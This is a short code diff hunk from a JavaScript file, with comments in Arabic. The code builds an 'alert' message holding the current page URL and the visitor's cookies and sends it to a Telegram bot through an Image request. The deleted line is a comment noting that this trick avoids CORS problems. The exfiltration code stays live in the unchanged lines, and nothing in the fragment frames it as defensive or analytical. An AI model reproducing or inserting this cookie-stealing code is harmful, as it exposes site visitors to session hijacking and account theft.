@@ -54,7 +54,6 @@
 
         const message = `🔔 تنبيه جديد!\n\n🌐 الرابط:\n${window.location.href}\n\n🍪 الكوكيز:\n${cookiesText}`;
 
-        // استخدام طريقة الـ Image لجعل الطلب يمر فوراً بدون مشاكل CORS
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
         const img = new Image();
